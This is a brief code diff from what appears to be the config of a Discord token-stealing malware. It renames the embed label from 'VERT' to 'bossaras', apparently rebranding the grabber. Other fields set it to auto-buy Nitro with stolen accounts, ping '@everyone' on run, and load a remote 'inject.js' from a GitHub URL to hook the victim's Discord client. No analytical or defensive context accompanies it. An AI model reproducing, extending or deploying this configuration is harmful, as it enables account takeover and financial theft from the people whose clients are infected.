@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: true,
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'VERT', 
+  embed_name: 'bossaras', 
   embed_icon: 'https://cdn.discordapp.com/attachments/961950134814535700/961987421879287878/IMG_9854.png'.replace(/ /g, '%20'), 
   embed_color: 8363488,
   injection_url: 'https://github.com/kostas756/BOSSARS6767/blob/main/Injection/inject.js', 
